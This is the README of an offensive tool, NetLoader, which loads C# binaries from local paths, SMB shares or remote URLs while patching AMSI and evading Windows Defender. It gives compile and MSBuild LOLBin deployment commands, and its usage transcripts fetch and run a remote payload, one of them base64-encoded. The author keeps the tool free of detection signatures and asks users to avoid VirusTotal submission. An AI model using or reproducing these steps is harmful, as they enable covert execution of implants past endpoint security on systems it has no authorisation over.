# NetLoader
Loads any C# binary from filepath or url, patching AMSI and bypassing Windows Defender on runtime

Latest update / signature fix was 09.06.2020, clean as a whistle
I am doing 24/7 signature checks and pushing updates when possible so I can keep NetLoader undetected (mainly for my own educational purposes).
**Please do not upload to VirusTotal and DISABLE "Sample Submission" when testing / possible**

**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!. SharpCollection contains nightly builds of C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.

# Compile

	c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:RandomName.exe Program.cs

# Deploy via LOLBin (MSBuild)

Payload for MSBuild is in the /LOLBins folder, might push this for varius other LOLBins aswell.
NetLoader has to be used in interactive mode when deployed using MSBuild

	For 64 bit:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml

	For 32 bit:
	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml

# Usage
Deploy payload from remote URI with args, non-interactive mode

	PS D:\NetLoader> .\NetLoader.exe https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin whoami
	[!] ~Flangvik  #NetLoader
	[+] Successfully patched AMSI!
	[+] URL/PATH : https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
	[+] Arguments : whoami
	windef\tigerking
	PS D:\NetLoader>

Deploy payload from remote URI with args, interactive mode

	PS D:\NetLoader> .\NetLoader.exe
	[!] ~Flangvik  #NetLoader
	[?] Input X in 'path or url' to exit!
	[?] Input path or url ->
	https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
	[?] Input args (optional) ->
	whoami
	[+] Successfully patched AMSI!
	[+] URL/PATH : https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
	[+] Arguments : whoami
	windef\tigerking
	PS D:\NetLoader>

Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote), non-interactive

	.\NetLoader.exe D:\Tools\Stracciatella.bin whoami
	[!] ~Flangvik  #NetLoader
	[+] Successfully patched AMSI!
	[+] URL/PATH : D:\Tools\Stracciatella.bin
	[+] Arguments : whoami
	windef\tigerking
	PS D:\NetLoader>


Supports base64 inputs for those long strings that would usually break stuff! (non-interactive)

	PS D:\NetLoader> .\NetLoader.exe --b64 aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci9yYXcvbWFzdGVyL0JpbmFyaWVzL1N0cmFjY2lhdGVsbGEuYmlu d2hvYW1p
	[!] ~Flangvik  #NetLoader
	[+] Successfully patched AMSI!
	[+] URL/PATH : https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin
	[+] Arguments : whoami
	windef\tigerking
	PS D:\NetLoader>


# Todo
- [X]  Automate the build and release of many of the Sharp Tools so they automagically appear in ~~/Binaries~~ [SharpCollection](https://github.com/Flangvik/SharpCollection) (CDI / Azure DevOps)
- [X]  Add support for non-interactive use (input args)
- [X]  Add support to run custom modules from your own URL or SMB Share (Great for on-the-fly Implant deployment)
- [X]  Add an working MSBuild XML payload for the LOLBins lovers (Myself included)
- [X]  Update with credits and links to the github repos that ~~/Binaries~~ [SharpCollection](https://github.com/Flangvik/SharpCollection) are compiled from

# Credits
[_RastaMouse](https://twitter.com/_RastaMouse/) for the [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs)

